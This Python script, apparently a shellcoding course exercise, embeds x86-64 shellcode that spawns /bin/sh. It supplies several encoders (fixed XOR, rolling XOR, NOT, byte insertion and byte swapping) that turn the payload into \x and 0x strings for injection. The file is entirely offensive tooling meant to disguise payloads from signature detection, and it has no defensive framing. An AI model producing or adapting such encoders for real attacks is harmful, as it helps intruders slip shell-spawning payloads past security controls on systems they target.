#!/usr/bin/env python

# Simple Shellcode Encoder

shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"

key = 0xaa

print("Shellcode length: {}\n".format(len(shellcode)))

def XOR():
    r1 = ""
    r2 = ""

    for eachByte in bytearray(shellcode):
        # XOR
        x = eachByte ^ key
        r1 += "\\x"
        r1 += "%02x" % x

        r2 += "0x"
        r2 += "%02x," % x

    print("Bitwise XOR encoder\n")
    print(f"{r1}\n\n{r2}")

def XOR2():
    global key
    r1 = ""
    r2 = ""

    for eachByte in bytearray(shellcode):
        # XOR2
        x = eachByte ^ key
        r1 += "\\x"
        r1 += "%02x" % x

        r2 += "0x"
        r2 += "%02x," % x

        key += 1
        if key == 0xb2:
            key = 0xaa

    print("Bitwise XOR2 encoder\n")
    print(f"{r1}\n\n{r2}")

def NOT():
    r1 = ""
    r2 = ""

    for eachByte in bytearray(shellcode):
        # XOR
        x = ~eachByte
        r1 += "\\x"
        r1 += "%02x" % (x & 0xff)

        r2 += "0x"
        r2 += "%02x," % (x & 0xff)

    print("Bitwise NOT encoder\n")
    print(f"{r1}\n\n{r2}")


def INS():
    r1 = ""
    r2 = ""

    for eachByte in bytearray(shellcode):
        r1 += "\\x"
        r1 += "%02x" % eachByte
        r1 += "\\x%02x" % key

        r2 += "0x"
        r2 += "%02x," % eachByte
        r2 += "0x%02x," % key

    print("Insert encoder\n")
    print(f"{r1}\n\n{r2}")

def SWP():
    r1 = ""
    r2 = ""

    t = [i for i in bytearray(shellcode)]
    j = len(t) - 1 # 32

    for i in range(0, 16, 2):
        t[0+i], t[j-i] = t[j-i], t[0+i]

    for i in t:
        r1 += "\\x"
        r1 += "%02x" % i

        r2 += "0x"
        r2 += "%02x," % i
    print(f'{r1}\n\n{r2}')

if __name__ == "__main__":
    SWP()
